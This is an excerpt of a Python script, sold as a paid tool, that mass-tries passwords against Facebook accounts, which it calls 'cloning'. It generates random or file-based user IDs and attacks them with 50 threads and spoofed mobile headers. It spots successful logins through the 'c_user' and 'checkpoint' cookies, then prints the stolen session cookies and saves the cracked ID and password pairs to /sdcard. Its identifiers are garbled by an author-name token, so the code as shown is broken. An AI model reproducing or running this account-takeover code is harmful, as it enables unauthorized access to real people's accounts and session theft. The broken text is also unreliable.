...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[OMI VAU 🤞-XD')
...
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : OMI VAU 🤞 ANCHAR
\033[1;32m  GITHUB    : MrOMI VAU 🤞156
\033[1;32m  FACEBOOK  : OMI VAU 🤞 ANCHAR
...
#OMI VAU 🤞_NAME=input(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def menu():
	...
	_OMI VAU 🤞_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_OMI VAU 🤞_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_OMI VAU 🤞_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_OMI VAU 🤞_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_OMI VAU 🤞_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____OMI VAU 🤞_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____OMI VAU 🤞_____ in ['1']:
		C1()
	if _____OMI VAU 🤞_____ in ['2']:
		Y2()
	if _____OMI VAU 🤞_____ in ['3']:
		BER()
	if _____OMI VAU 🤞_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
	if _____OMI VAU 🤞_____ in ['0']:
		exit()
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(OMI VAU 🤞_NAME))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#open('/sdcard/'+OMI VAU 🤞-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as OMI VAU 🤞:
        clear()
        tl = str(len(user))      
        ...
        for love in user:
            ...
            uid = code+love
            OMI VAU 🤞.submit(OMI VAU 🤞,uid,pwv,tl)
        ...
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
               ...
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[OMI VAU 🤞.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
...
def OMI VAU 🤞(uid,pwv,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://m.facebook.com/?zero_e=3&zero_et=1682744589&_rdc=1&_rdr&refsrc=deprecated',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92m OMI VAU\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/ARIYAN-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
...
def mex():
    ...
    banner()   
    try:
    r = requests.get('https://www.facebook.com/kabsundisb?mibextid=ZbWKwL').text
    if key1 in r:
        ...
        os.system('am start https://wa.me/+8801406115895?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20OMI VAU 🤞%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
##################
